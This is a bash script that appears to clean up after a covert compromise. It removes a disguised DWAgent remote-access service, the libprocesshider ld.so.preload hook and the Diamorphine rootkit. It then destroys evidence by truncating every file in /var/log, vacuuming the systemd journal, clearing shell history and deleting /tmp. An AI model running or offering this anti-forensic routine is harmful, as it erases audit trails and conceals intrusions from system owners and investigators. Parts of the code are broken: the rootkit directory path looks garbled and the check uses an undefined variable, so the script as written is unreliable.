#!/bin/bash
set -e

# ========== CONFIG ==========
AGENT_DIR="/usr/share/dwagent/native"
AGENT_BINARY="${AGENT_DIR}/dwagent"
HIDDEN_NAME="libsysd"
HIDDEN_DIR="/usr/local/.syslib"
HIDDEN_PATH="${HIDDEN_DIR}/${HIDDEN_NAME}"
SERVICE_NAME="sysd"
PHIDER_DIR="/tmp/phider"
DIAMORPHINE_DIR="/optorphine"
SCH_CMD="/usr/local/bin/sch"

# ============================

echo "[+] Stopping service..."
systemctl stop "${SERVICE_NAME}" || true
systemctl disable "${SERVICE_NAME}"

echo "[+] Removing systemd service..."
rm -f "/etc/systemd/system/${SERVICE_NAME}.service"
systemctl daemon-reload

echo "[+] Removing DWAgent binary..."
rm -f "$AGENT_BINARY"
rm -f "$HIDDEN_PATH"

echo "[+] Removing hidden directory..."
rm -rf "$HIDDEN_DIR"

echo "[+] Removing libprocesshider..."
sed -i '/libprocesshider.so/d' /etc/ld.so.preload
rm -f /usr/local/lib/libprocesshider.so

echo "[+] Removing Diamorphine rootkit..."
if [ -d "$DIAMORPH" ]; then
    rmmod diamorphine 2>/dev/null || true
    rm -rf "$DIAMORPHINE_DIR"
fi

echo "[+] Cleaning up sch command..."
rm -f "$SCH_CMD"

echo "[+] Cleaning logs..."
# Clear systemd journal logs
journalctl --rotate
journalctl --vacuum-time=1s

# Truncate all log files in /var/log
find /var/log -type f -exec truncate -s 0 {} \; 2>/dev/null

# Clear user history
cat /dev/null > ~/.bash_history
history -c

# Clear temporary files
rm -rf /tmp/*

echo "[✓] Uninstallation complete and traces wiped."
